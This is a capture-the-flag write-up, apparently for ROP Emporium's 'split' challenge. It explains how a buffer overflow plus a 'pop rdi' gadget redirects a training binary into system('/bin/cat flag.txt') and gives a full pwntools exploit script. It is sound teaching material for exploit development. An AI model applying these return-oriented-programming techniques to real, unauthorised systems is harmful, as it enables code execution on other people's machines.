# Split

This challenge is very similar to challenge 1 (ret2win). We must once again return to a call to system() that reads the flag file. However, as is in the name of the challenge, the instructions to do this are no longer together in a convenient function, but have been split up.

The binary already contains the string "/bin/cat flag.txt". We can find it by loading the binary into Ghidra and using the string search feature. This reveals the string is stored at the address 0x601060.

The binary also already contains a call to system(). We can find it by looking up system and Ghidra and reviewing the references. This shows system() is called in the following function (the call to system is at 0x40074b):
```
void usefulFunction(void) {
  system("/bin/ls");
  return;
}
```
The problem now lies in the fact that system() is called with "/bin/ls", which is not what we want. We want to be able to provide our own argument to system(), namely "/bin/cat flag.txt" which we have at 0x601060. The argument to system() is provided via the rdi register. If we can thus place our string "/bin/cat flag.txt" into the rdi register before calling system(), we get the desired functionality! To do this we can find a gadget to set rdi:
```
ropper --file split | grep rdi
...
0x00000000004007c3: pop rdi; ret;
```
Our payload thus becomes the following:
```
cat_flag_string = p64(0x601060)
system_call = p64(0x40074b)
pop_rdi = p64(0x4007c3)

payload = b"A"*40
payload += pop_rdi
payload += cat_flag_string
payload += system_call
```
This payload overwrites the return address with the address of our pop rdi gadget. This gadget then pops a value from the stack and places it into rdi. The value popped by this gadget is the next value on our payload, the address of the string "/bin/cat flag.txt". After popping this value from the stack, our gadget returns. When this return happens, the next value on the stack is placed into the instruction pointer. For this return address, we provide the address of the call to system().

The full script is thus as follows:
```
#!/usr/bin/env python3

from pwn import *
import subprocess


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


"""
notes:

"""

gdbscript = ""

breakpoints = [
]

for s in breakpoints:
    gdbscript += s + "\n"


exe = "./split"
elf = context.binary = ELF(exe, checksec=False)
# context.log_level = 'info' # use DEBUG in args for debugging. LOG_LEVEL=warn/info/error for anything else

"""
if args.REMOTE:
    libc = ELF('./libc.so.6', checksec=False)
else:
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
"""

# ===========================================================
#                    EXPLOIT STARTS HERE
# ===========================================================

io = start()

cat_flag_string = p64(0x601060)
system_call = p64(0x40074b)
pop_rdi = p64(0x4007c3)

payload = b"A"*40
payload += pop_rdi
payload += cat_flag_string
payload += system_call


io.sendlineafter(b">", payload)

io.interactive()
```
